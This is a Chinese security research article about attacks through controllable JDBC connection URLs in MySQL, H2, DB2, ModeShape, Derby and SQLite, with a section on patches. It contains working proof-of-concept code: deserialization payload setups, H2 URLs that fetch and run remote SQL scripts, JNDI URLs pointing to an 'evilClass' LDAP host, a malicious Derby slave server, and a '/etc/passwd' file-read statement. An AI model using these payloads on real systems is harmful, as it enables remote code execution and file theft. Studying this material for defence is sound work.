**作者：su18  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

当一个 JDBC 连接 URL 可控时，能造成什么影响？相关的若干攻击方法已经被披露很长时间了，但是我还一直都没有学习，随着 HITB2021SIN
中的分享议题 "[Make JDBC Attacks Brilliant
Again](https://www.youtube.com/watch?v=MJWI8YXH1lg&ab_channel=HackInTheBoxSecurityConference)"
的视频上传到了 Youtube 上之后，我觉得实在是不能再拖了，于是就有了这篇文章，本文记录了相关的学习和研究成果，并集合了相关的漏洞代码。

在看本篇文章时，可以边结合视频，边看 PPT 边看我对其的讲解分析，打开 youtube
的自动字幕和自动翻译，结合本文，对英文不好的同学来说可能更容易一点。

# 开端

在 2019 年欧洲 BlackHat 大会上, 一个名为 "[New Exploit Technique In Java Deserialization
Attack](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)" 的议题由 Back2Zero 安全团队的 Yongtao
Wang, Lucas Zhang, Kevin Li 以及 Kunzhe Chai 分享出来，首次披露了 JDBC 相关反序列化攻击的利用技术。

视频也上传到了
[youtube](https://www.youtube.com/watch?v=Lv9BC_bYaI8&ab_channel=BlackHat)
上，首先来跟着 PPT 学习一下。

## Introduction to Java Deserialization

这个议题根据其 PPT 一共有 5 个部分，第一部分是对 Java
反序列化漏洞的一些介绍，比较基础，这里我就不再描述了，之前我也写过一篇相关的文章[《Java反序列化取经路》](https://su18.org/post/ysuserial/),对基础有问题的朋友可以先补一下。这里我就直接贴几张议题中的
PPT。

![](https://images.seebug.org/content/images/2022/02/15/1644916222000-1630543970926.png-w331s)

攻击场景，以及一些再反序列化过程中会自动触发的方法

![](https://images.seebug.org/content/images/2022/02/15/1644916222000-1630545978902.png-w331s)

一个有漏洞的类的举例，可以看到，在重写的 readObject 中执行了文件删除的操作

![](https://images.seebug.org/content/images/2022/02/15/1644916222000-1630546078962.png-w331s)

## Well-Known Defense Solutions

Lucas 列举出了三种广泛使用的防御反序列化漏洞的方案。

  1. **黑名单校验** 通过在反序列化过程中对输入流进行校验来确保其安全性. 如果反序列化过程中遇到了黑名单的类，将会终止反序列化进程。一般是通过增强 resolvClass 方法来实现的。 我们可以在 Jackson/Weblogic 以及开源项目 SerialKiller 中看到这种防御机制的实现。
  2. **JEP290(过滤机制)** JEP290 提供了一个 Filter 机制，可以对反序列化数据的输入流进行过滤，来提高安全性。官方文档可以看[这里](https://blogs.oracle.com/java/post/filter-incoming-serialization-data-a-little-of-jdk-9-goodness-available-now-in-current-release-families)。每当进行一次反序列化操作时，底层就会根据filter中的内容来进行判断，从而防止恶意的类进行反序列化操作。此外，还可以限制反序列化数据的信息，比如数组的长度、字节流长度、字节流深度以及使用引用的个数等。filter返回accept，reject或者undecided几个状态，然后用户根据状态进行决策。
  3. **Runtime Application Self-protection(RASP)** RASP 大家应该都不陌生了，这里就不多说了, 在 JavaSec 里园长写了一篇[文章](https://javasec.org/java-rasp/)，大家可以看一看。总体来说，RASP 是在程序运行时基于行为的防御，不基于规则，也不基于黑名单。 但各家 RASP 实现参差不齐，部分 RASP 可能仅仅关注了简单的命令执行功能的防御，而对其他的防御没有到位。

这三种通用的方法，还不是完美的防御方案，可能存在一些瑕疵： \- 如果我们找到了一条新的反序列化利用链，就可以绕过基于黑名单的反序列化防御机制； \-大多数的安全研究员一般情况下会找一些包含常见危险函数的 Gadget，比如执行命令的 `Runtime.exec()`，导致一些防御措施甚至是 RASP
也仅仅防御了这些常见的危险函数，此时如果我们发现了一个 Java 中的攻击向量，就可以绕过绝大部分的防御手段。

## Critical vulnerabilities in Java

接下来 Lucas 公布了两个能带来较大危害的攻击向量。

### URLConnection

提到 URLConnection，我能想到的漏洞利用就只有 SSRF，但是 Lucas 将其延伸至 NTLM Reflection Attack
(CVE-2019-1040) 并且获得了本地 Windows 凭证信息。

![](https://images.seebug.org/content/images/2022/02/15/1644916222000-1630547981095.png-w331s)

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630547986121.png-w331s)

这部分不是本文的重点，所以也将其略过。

### JDBC

这部分的议题由 Kunzhe Chai 给出了相关的讲解。

JDBC 是 JavaSE 中一个重要的 API，定义了一个客户端连接数据库的方式。

开发人员使用 JDBC 与数据库建立连接，对数据库执行查询和更新语句，并检索从数据库接收到的结果。下面是一个常见的创建连接并查询数据的过程：

    
    
    public static void main(String[] args) throws Exception {
    
            String CLASS_NAME = "com.mysql.jdbc.Driver";
            String URL        = "jdbc:mysql://localhost:3306/test";
            String USERNAME   = "root";
            String PASSWORD   = "root";
    
            Class.forName(CLASS_NAME);
            Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
    
            Statement statement = connection.createStatement();
            statement.execute("select 10086");
            ResultSet set = statement.getResultSet();
            while (set.next()) {
                System.out.println(set.getString(1));
            }
    
            statement.close();
            connection.close();
        }

JDBC 通常使用不同的 URL/URI 连接字符串来与指定类型的数据库建立连接，这个 URL 主要包含三个部分: 驱动名称、连接地址以及扩展参数。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630551377896.png-w331s)

而 "扩展参数" 就是本次导致安全漏洞的一个重要的部分。

Mysql JDBC 中包含一个危险的扩展参数： ” **autoDeserialize** “。这个参数配置为 true 时，JDBC
客户端将会自动反序列化服务端返回的数据，这就产生了 RCE。

此时如果攻击者作为 MYSQL 服务器的角色，给客户端返回了恶意的序列化数据，客户端就会自动反序列化触发恶意代码，造成漏洞。

在此处我们以 mysql-connector-java 8.0.14 为例，类
`com.mysql.cj.jdbc.result.ResultSetImpl` 实现了 `java.sql.ResultSet` 并且重写了
`getObject()` 方法。

如果在 JdbcConnection 的相关属性中找到了 "autoDeserialize" 参数，客户端就会读取服务端返回数据并执行其
`readObject()` 方法，这就是 mysql jdbc 攻击的最根本原因。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630553400164.png-w331s)

但是在默认情况下 JDBC 客户端不会调用 `getObject()` 函数来处理攻击者的数据，所以还需要找到一个可以触发的方式。

经过了一番深入的研究，Kunzhe Chai 找到了一个可以触发这个方法的扩展参数 : queryInterceptors。

"queryInterceptors" 参数可以指定接口 `com.mysql.cj.interceptors.QueryInterceptor`
的子类，通过名字可以看到，这是一个起到”拦截器“作用的类。在这些拦截器的实现类中，可以修改或增强语句的某些子级所做的处理，例如自动检查 memcached
服务器中的查询数据、重写慢速查询、记录有关语句执行的信息，或将请求路由到远程服务器。总体来说，这是一个为查询提供自动化增强功能的参数。

根据相关的[文档](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-statements.html#cj-conn-prop_queryInterceptors), "queryInterceptors"
配置是从 8.0.7 版本开始支持的。

接口 QueryInterceptor 提供了一个完整的拦截流程如
`init`->`preProcess`->`postProcess`->`destroy`, 而且 QueryInterceptors 是
"chainable" 的，也就是链式的，可以指定多个 QueryInterceptor ，上一个处理的结果会传递给下一个
QueryInterceptor。

在 mysql-connector-java 中，QueryInterceptor 有好几个实现类。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630559585180.png-w331s)

Chai 发现 `ServerStatusDiffInterceptor` 会调用 `getObject` 方法，接下来看一下具体的调用链。

ServerStatusDiffInterceptor 用于显示在查询之间服务器状态的差异，`preProcess()`/`postProcess()`
调用 `populateMapWithSessionStatusValues()`方法。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630560911905.png-w331s)

`populateMapWithSessionStatusValues()` 使用已经建立的 connection 创建并执行了一个新的语句 `SHOW
SESSION STATUS`，并调用 `ResultSetUtil.resultSetToMap()` 处理返回结果。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630561003459.png-w331s)

`resultSetToMap` 调用了之前我们提到的 `getObject()` 方法，连成了一条调用链。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630561320404.png-w331s)

有了上面的知识点的积累，我们已经找到了一条反序列化的攻击路径：如果我们可以控制 JDBC URI，我们就可以： \- 将 JDBC
连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据。 \- 指定 autoDeserialize 参数为 true，mysql
客户端就可以自动反序列化恶意 payload。 \- 使用 ServerStatusDiffInterceptor 触发客户端和服务端的交互和反序列化。

攻击 JDBC 的步骤大概分为:

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630561963768.png-w331s)

## New exploit for Java Deserialization

在这一 part，Kunzhe Chai 组合了 3 个漏洞(反序列化/NTLM Hash Leaking/NTLM Reflection Attack)
组成了 RCE 漏洞利用。

然后他制作了一个视频来演示在一个真实环境中的攻击。

然后他展示了他找到的其他可以触发 URLConnection 的 gadget，可以触发其他例如 Java 反序列化/Jackson 的漏洞利用。

依旧不是本篇文章的重点，继续略过。

## Takeaways

在 PPT 的结尾，Chai 给开发人员和安全研究人员都提了一些建议：

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630563803916.png-w331s)

# 后续

在听整个演讲的过程中，我一直有个疑问，演讲之后的提问环节恰好有个老外问了这个问题:

> 攻击者可以控制 jdbc url 的情况好像并不常见，在什么情况下我们可以在现实世界中执行这个攻击呢？

这确实是一个比较现实的问题，Lucas 给出了他的答案：云平台配置。

然后这个老外接着问，有没有一个独立的产品，不正确的允许了攻击者配置 jdbc url。我感觉这个老外可能并不认可这种漏洞利用链作为一种攻击手段。

Lucas 好像没懂他的问题，并没有给出清晰的解释。同时我也觉得应该不会有商业化产品能允许攻击者未授权的修改 jdbc connection url。

但是无论如何，这种技术永远可以用来进行反制红队或者威胁诱捕（比如说蜜罐）。

在会议中，Lucas 和 Chai 仅仅提供了思路，并没有提供能够返回恶意序列化的 mysql 服务端。

几个月后，codeplutos 使用了修改后的 MySQL 插件来成功创建了恶意服务器，并且使用了一个新的扩展参数：
detectCustomCollations 。

当在 jdbc 连接参数中设置了 `detectCustomCollations=true` 时，也可以触发反序列化的流程，调用点在
`com.mysql.jdbc.ConnectionImpl#buildCollationMapping`， 依赖是 mysql-connector-java 5.1.29。

![](https://images.seebug.org/content/images/2022/02/15/1644916223000-1630571254492.png-w331s)

`buildCollationMapping` 方法会执行 SQL 语句 `SHOW COLLATION` 并调用
`Util.resultSetToMap()` 处理返回结果。

`resultSetToMap()` 方法调用 `getObject()` 导致反序列化。

![](https://images.seebug.org/content/images/2022/02/15/1644916224000-1630571261454.png-w331s)

无论用上面哪条触发链，我们都需要创建一个恶意的 mysql 服务端来针对这两条在建立连接时触发 gadget 中执行的 SQL 语句进行响应： \-`SHOW SESSION STATUS` \- `SHOW COLLATION`

但是该如何创建?

一个月后, fnmsd 师傅发布他的 [研究文章](https://www.anquanke.com/post/id/203086) 以及他的 [fake
server 项目](https://github.com/fnmsd/MySQL_Fake_Server)。

fnmsd 师傅在分析了 MySQL connector/J 的不同版本后，给出了一个统一的总结，并给出了不同版本所需的恶意 URL。

十分建议先学习一下 fnmsd 师傅的文章。

# 打造自己的恶意服务器

在了解了调用链和原理后，下一步我们可以打造一个属于自己的恶意服务器。有以下几种实现思路： \- 从头开始编写一个伪 MySQL 服务器，兼容 MySQL
的协议交互和 MySQL SQL 语法执行的流程。（需要了解通信协议和实现机制，工作量太大） \- 对 jdbc 连接过程中的全部 TCP
进行抓包，分析服务端和客户端交互的全部流程，包括握手、认证、执行语句等等, 重现整个交互流程，在指定位置返回恶意数据包。（fnmsd
师傅应该就是这样实现的） \- 通过修改后的 mysql 插件来实现相应的功能。（codeplutos 师傅的实现方式）

但这些方法对我来说都太复杂了，所以我尝试使用了更简单更优雅的方式创建了自己的恶意服务器，使用了所谓的：”数据库中间件“。

我找到了一个 alibaba 的开源项目 [cobar](https://github.com/alibaba/cobar)，
它是一个分片数据库的代理，不过你管它叫什么都行，实际上它就是一个客户端和服务端的中间的代理。

在使用 cobar 等数据库中间件时，对于真正的客户端，cobar 扮演 Mysql 服务器的角色；对于真正的服务器，cobar
是其客户端。因此，它是我们控制特定语句执行结果的完美工具。

Talk is cheap.让我们在实际环境中演示真正的攻击过程： \- Real Mysql Server: 5.6.35 \- cobar: 4.0.0
\- mysql-connector-java: 5.1.29 \- 客户端依赖: commons-collections-3.2.1 \- 攻击方式:
detectCustomCollations

## 准备恶意序列化数据

首先，生成恶意序列化 payload，在我的演示环境里使用了 CC1 的利用链，并且最终调用 `Runtime.exec()` 执行系统命令 "open
-a Calculator.app" 弹出计算器，图中是我学习 ysoserial
中使用的[工具](https://github.com/su18/ysoserial)，你可以使用任何工具生成任何利用链。

![](https://images.seebug.org/content/images/2022/02/15/1644916224000-1630658268791.png-w331s)

然后，在真实的 Mysql 服务器创建一个储存恶意序列化数据的表，表中至少有 3 个字段，并且第三个字段的数据类型是 blob。

![](https://images.seebug.org/content/images/2022/02/15/1644916224000-1630716373743.png-w331s)

因为对于 detectCustomCollations 攻击方式来说，触发的第三个字段结果的对象反序列化，所以要在指定位置准备恶意 payload。

![](https://images.seebug.org/content/images/2022/02/15/1644916224000-1630717079649.png-w331s)

最后，我们使用如下代码将恶意序列化的数据插入表中:

    
    
    public static void main(String[] args) throws Exception {
    
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://localhost:3306/test";
        String USERNAME   = "root";
        String PASSWORD   = "123456";
    
        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
    
        File file   = new File("/Users/phoebe/IdeaProjects/ysoserial-su18/CC1WithTransformedMap.bin");
        int  length = (int) file.length();
    
        FileInputStream stream = new FileInputStream(file);
    
        PreparedStatement statement = connection.prepareStatement("INSERT INTO evil (`a`,`b`,`c`) VALUES (1,1,?)");
        statement.setBlob(1, stream, length);
        statement.execute();
    
        statement.close();
        connection.close();
    }

## 配置代理层 Mysql 服务器

准备好存放恶意类的数据库后，就要配置数据库中间件，也就是 cobar，根据其配置文件规则，让其连接到 Mysql Server:

![](https://images.seebug.org/content/images/2022/02/15/1644916224000-1630657647759.png-w331s)

接下来配置 cobar 提供服务的一些参数，等待客户端的连接。

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630657682217.png-w331s)

启动 cobar 后，他就变成了客户端到真实服务器的一个代理，无论再客户端执行了什么 sql 语句，cobar 都会先读取并解析，然后由 cobar
再去服务端执行查询获取结果。

我们已经知道，如果我们在 jdbc 连接参数中设置了 `detectCustomCollations=true` ， jdbc connector 会执行
`SHOW COLLATION` 语句，并尝试对返回字段的第三个字段进行反序列化。

在使用了 cobar 后，我们可以在中间层面替换执行的 sql 语句，仅仅需要如下两行简单的代码:

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630717632560.png-w331s)

将这两行代码加入 `com.alibaba.cobar.server.ServerConnection#execute` 方法中，当 cobar 获取
`SHOW COLLATION` 语句后，就会向真实的服务器中执行 `select * from evil`，服务器会返回我们事先准备好的恶意字节码。

## 建立连接

使用 cobar 来建立连接。

    
    
    public static void main(String[] args) throws Exception {
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://localhost:8066/dbtest?detectCustomCollations=true&autoDeserialize=true";
        String USERNAME   = "root";
        String PASSWORD   = "123456";
    
        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
        connection.close();
    }

成功弹出计算器。

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630720017537.png-w331s)

# Cheat Sheet

下面是 fnmsd 师傅文章中的两个截图，可以用来做 Cheat Sheet。

## ServerStatusDiffInterceptor

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630730354237.png-w331s)

## detectCustomCollations

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630730360676.png-w331s)

# Arbitrary File Reading Vulnerability

除了操控 JDBC URI 导致反序列化漏洞之外, 在很久之前还披露了一种能够导致任意文件读取的 JDBC 攻击手段。

如果 mysql 客户端在连接服务端时使用了 `–enable-local-infile` 选项，并执行 `LOAD DATA LOCAL INFILE
'/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';`
语句，客户端会读取本地的文件并将其内容发送至服务端。

因此，如果 mysql 服务器是不受信任的服务器，一个简单的建立连接行为可能会导致对客户端的任意文件读取。更多的细节可以查看 LoRexxar 师傅的相关
[博客](https://lorexxar.cn/2020/01/14/css-mysql-chain) 以及 Github 上的
[恶意服务器项目](https://github.com/Gifts/Rogue-MySql-Server)。

Jdbc connector 中的 Sink 点位于 `com.mysql.jdbc.MysqlIO#sendFileToServer`。

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630734728926.png-w331s)

# Make JDBC Attacks Brilliant Again

本篇议题由 Litch1 和 pyn3rd 在 HITB SECCONF SIN-2021 上分享。演讲 PPT
在[这里](https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf)
，议题视频在[这里](https://www.youtube.com/watch?v=MJWI8YXH1lg&ab_channel=HackInTheBoxSecurityConference)。线上讲解的是
Litch1 师傅。接下来跟着大佬的分享一起学习学习。

首先，他介绍了一下背景，并回顾了使用 ServerStatusDiffInterceptor 在不同版本中利用的的情况。

![](https://images.seebug.org/content/images/2022/02/15/1644916225000-1630887629022.png-w331s)

随后他列举了使用 jdbc 攻击技术的常见场景： \- 新反序列化链（如 fastjson/jackson，getter/setter
方法中包括初始化数据库链接的逻辑） \- 攻击 SpringBoot Actuator \- API 接口暴露 \- 钓鱼，蜜罐

然后他给出了一些典型的 jdbc 攻击案例。

## CSRF to JDBC Attack(Weblogic)

Weblogic (CVE-2020-2934), 由于 Weblogic 在创建 JDBCDataSourceForm 的接口中没有 CSRF
检测，攻击者可以使用 csrf 攻击结合 jdbc attack 技术组合为 RCE。

![](https://images.seebug.org/content/images/2022/02/15/1644916226000-1630893585699.png-w331s)

根据 PPT 中的截图，我跳过了 csrf 的部分复现了攻击。

![](https://images.seebug.org/content/images/2022/02/15/1644916226000-1630895850214.png-w331s)

## Reconfigure JDBC Resource(Wildfy)

JBOSS/Wildfy，在后台或各种中间件的内容管理系统中也有 jdbc 数据源的相关配置功能。例如 JBoss/Wildfy，因为 h2 数据库的
Driver 是内置的，攻击者可以在后台重新配置 jdbc 并实现攻击。

![](https://images.seebug.org/content/images/2022/02/15/1644916226000-1630896558338.png-w331s)

## H2 RCE

H2 的攻击使用了 Spring Boot H2 console 的特性，通过更改 h2 数据库的连接 url，攻击者可以迫使 spring boot
从远程运行 SQL 脚本。

    
    
    jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'

脚本如下，创建了一个调用 `Runtime.getRuntime().exec()`的函数并执行弹出计算器命令。

    
    
    CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "su18";}';CALL EXEC ('open -a Calculator.app')

需要如下参数:

    
    
    spring.h2.console.enable=true
    spring.h2.console.setting.web-allow-others=true

复现截图如下：

![](https://images.seebug.org/content/images/2022/02/15/1644916226000-1630899506476.png-w331s)

攻击是如何执行的呢？

### INIT RUNSCRIPT

Sink 点在 `org.h2.engine.Engine#openSession`，h2 引擎在参数中拆分 ”INIT“ 参数并使用
CommandInterface 的不同实现类来根据配置初始化数据库连接。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630906885336.png-w331s)

在本案例下，具体的处理类是 `org.h2.command.CommandContainer`。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630910275862.png-w331s)

当使用 RUNSCRIPT 命令时， h2 数据库最终会调用 `org.h2.command.dml.RunScriptCommand#execute`
执行恶意 SQL 语句。

在这里为什么要使用 ”RUNSCRIPT“命令呢？

因为我们使用的 POC 需要执行两条 SQL 语句，第一条是 CREATE ALIAS 定义方法，第二条是 EXEC 执行。然而
`session.prepareCommand` 不支持多条 SQL 语句的执行。因此我们需要使用 RUNSCRIPT 命令从远端服务器加载 sql 语句。

但这也意味着攻击需要网络连接，如何绕过网络的限制？由于 h2 是一个嵌入式数据库，因此有可能发现不需要任何外部连接的攻击。

### Source Code Compiler

因此，我们应该找到一种方法，将 POC sql 简化为一条语句，这样就省去了交互，不用连接远程数据库。

Litch1 翻了 `CREATE ALIAS` 实现的源代码，发现在 SQL 语句中对于 JAVA
方法的定义被交给了源代码编译器。有三种支持的编译器：Java/Javascript/Groovy。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630916267145.png-w331s)

首先来看一下 Groovy。

在 `org.h2.util.SourceCompiler#getClass` 方法， h2 使用 `isGroovySource` 来判断是不是
Groovy 源代码。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630916970678.png-w331s)

如果是，则调用 `GroovyCompiler.parseClass()` 来解析 groovy 代码。这与 Orange 在 [Hacking
Jenkins Part 2](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/) 议题中分析的 Sink 点是一致的.

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630916865214.png-w331s)

由此 Litch1 给出了使用 `@groovy.transform.ASTTEST` 在 AST 中使用 assert 执行命令的 POC。

    
    
    public static void main (String[] args) throws ClassNotFoundException, SQLException {
        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }

然而 Groovy 依赖并不容易遇到，因此 Litch1 又给出了使用 JavaScript 和 `CREATE TRIGGER`
的利用链，这条链不仅仅编译源代码，还调用了 eval 执行。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630925694016.png-w331s)

POC 如下:

    
    
    public static void main (String[] args) throws ClassNotFoundException, SQLException {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }

## IBM DB2

MySQL 中发现的漏洞是由于其可配置属性的特性造成的。那么，如果可控，是否还有其他可配置属性会导致漏洞？

在 DB2 中，Litch1 找到了 `clientRerouteServerListJNDINameIdentifies`。这个属性的作用是什么呢？如下：

It's a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI
repository of reroute server `information.clientRerouteServerListJNDIName`
applies only to IBM Data Server Driver for JDBC and SQLJ type 4 connectivity,
and to connections that are established through the DataSource interface.

翻译成人话，就是这个 JDBC URL 配置可以导致 JNDI 注入。

POC 如下:

    
    
    public static void main(String[] args) throws Exception {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;");
    }

## ModeShape

[ModeShape](https://modeshape.jboss.org/) 是一个 JCR(Java Content Repository)
的实现，使用 JCR API 来从其他系统中获取数据，例如文件系统、 JDBC 元数据等。

Repository 源可以配置成 `jdbc:jcr:jndi:jcr:?repositoryName=repository`.

很明显又是一个 JNDI 注入，如下:

    
    
    public static void main(String[] args) throws Exception {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
        // A JNDI URL that points the hierarchical database to an evil LDAP service 
        DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass");
    }

## Apache Derby

Apache Derby 像 h2 一样，有时会被内嵌在一些系统中。在 derby 驱动源代码中 Litch1 在
`org.apache.derby.impl.store.replication.net.SocketConnection`
类中找到了一个可疑的反序列化调用。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630929631196.png-w331s)

然后他发现了一个内部类 `ReplicationMessageTransmit$MasterReceiverThread` 调用了这个方法。

![](https://images.seebug.org/content/images/2022/02/15/1644916227000-1630929950540.png-w331s)

`ReplicationMessageTransmit` 类是在配置了 `startMaster=true` 和 `slaveHost=127.0.0.2`
之后用来在主从服务器之间拷贝数据的。

如果我们将 slaveHost 字段配置成为了恶意的服务器，derby 会建立 JDBC 连接并读取恶意数据，`MasterReceiverThread`
调用 `readMessage` 方法，恶意服务器将返回恶意代码并触发反序列化利用。

POC 如下:

    
    
    public static void main(String[] args) throws Exception{
        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
        DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip");
    }

恶意的 SLAVE 服务器如下:

    
    
    public class EvilSlaveServer {
        public static void main(String[] args) throws Exception {
            int port = 4851;
            ServerSocket server = new ServerSocket(port);
            Socket socket = server.accept();
            socket.getOutputStream().write(Serializer.serialize(new CommonsBeanutils1().getObject("open -a Calculator")));
            socket.getOutputStream().flush();
            Thread.sleep(TimeUnit.SECONDS.toMillis(5));
            socket.close();
            server.close();
        }
    }

## SQLite

在使用 SQLite 时， `org.sqlite.core.CoreConnection#open` 方法会在与服务器建立连接时被调用。

这个方法提供了一个特性: 如果 connection URL 以 `:resource:` 开头，将会调用 `extractResource` 方法从
URL 连接获取数据库内容。

![](https://images.seebug.org/content/images/2022/02/15/1644916228000-1631003008206.png-w331s)

`extractResource()`方法代码如下:

![](https://images.seebug.org/content/images/2022/02/15/1644916228000-1631003457311.png-w331s)

从这个方法我们可以看出，当我们的连接 URL 如下
`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`，SQLite 会尝试请求地址并从中读取内容。

这首先无疑是个 SSRF，但是 SSRF 是不够的。

那么当我们能控制 JDBC URL 和数据库文件内容时，该如何执行攻击呢？

根据 "[SELECT code_execution FROM * USING
SQLite;](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/)"，我们可以使用 ”CREATE VIEW“ 不可控的 SELECT 语句转换为可控的 SELECT 语句。

如果我们可以控制 SELECT 语句，我们可以使用 `SELECT load_extension('/tmp/test.so')` 来加载 dll/so
并执行恶意代码，但是在实际环境中，并不是经常能遇见服务器上文件可控的情况，而且 load_extension 默认是不开启的。

除了常见的漏洞之外，我们还可以使用 SQLite 中的内存损坏例如 “Magellan” 来导致JVM崩溃。（超出知识范围）

![](https://images.seebug.org/content/images/2022/02/15/1644916228000-1631004798737.png-w331s)

# 如何防御

以上就是 Litch1 研究和总结的全部攻击 JDBC Connection URL 的相关内容。

这一部分讨论一下开源软件都是怎么抵御 JDBC 攻击的。

**Apache Druid CVE-2021-26919 补丁**

![](https://images.seebug.org/content/images/2022/02/15/1644916228000-1631070799291.png-w331s)

**Apache DolphinScheduler CVE-2020-11974 补丁**

![](https://images.seebug.org/content/images/2022/02/15/1644916228000-1631070829350.png-w331s)

我们可以利用属性过滤器解析器和 JDBC 驱动程序解析器之间的差异，并使用它绕过安全补丁。

# Java Service Provider Interface

SPI 技术用于加载 JDBC 连接器的驱动程序。

![](https://images.seebug.org/content/images/2022/02/15/1644916229000-1631091471854.png-w331s)

5.1.48 版本的 mysql connector，注册了两个 JDBC 驱动器。除了常规的
`com.mysql.cj.jdbc.Driver`，还有一个`com.mysql.fabric.jdbc.FabricMySQLDriver`。

MySQL Fabric 是一个用于管理 MySQL 服务器群的系统。MySQL Fabric 提供了一个广泛且易于使用的系统，用于管理 MySQL
部署以实现共享和高可用性。

Litch1 研究了 FabricMySQLDriver 的源码，发现如果 connection url 以 `jdbc:mysql:fabric://`
开头，程序将会进入 Fabric 的处理逻辑。

![](./https://images.seebug.org/content/images/2022/02/15/1644916229000-1631153937968.png-w331s)

并将向主机发送一个 XMLRPC 请求。

![](https://images.seebug.org/content/images/2022/02/15/1644916229000-1631154094720.png-w331s)

关键的代码点都在上面两张 PPT 中，在使用 Fabric 驱动时，在建立 JDBC 连接后，会自动触发一个 XMLRPC 请求，这显然是一个 SSRF。

但某位大牛曾经说过，SSRF 是 RCE 的起手式。Litch1 继续深挖，发现了在处理相应数据时产生的 XXE 漏洞。

![](https://images.seebug.org/content/images/2022/02/15/1644916229000-1631154734217.png-w331s)

所以漏洞触发过程很简单，建立连接，解析 XML，PPT 中给出了恶意服务端的 python 源代码。

![](https://images.seebug.org/content/images/2022/02/15/1644916229000-1631154417536.png-w331s)

# 总结

全部的测试环境和代码已经公开在了 Github 项目中，请移步查看：<https://github.com/su18/JDBC-Attack>

# 彩蛋

在群聊赛博回忆录中，有师傅提到，PostgreSQL Connection URL 有几个参数可以导致问题，研究了一下之后发现可以
getshell，目前没有更新在项目中，这里作为彩蛋提一下，有兴趣的师傅自行研究吧~

# 引用

<https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf>

[https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf](https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf)

<https://paper.seebug.org/1227/>

<https://www.cnblogs.com/Welk1n/p/12056097.html>

<https://github.com/fnmsd/MySQL_Fake_Server>

<https://github.com/Gifts/Rogue-MySql-Server>

<https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload>

<https://github.com/alibaba/cobar>

<https://www.anquanke.com/post/id/203086>

<https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-interceptors.html>

<http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/>

<https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927>

<https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html>

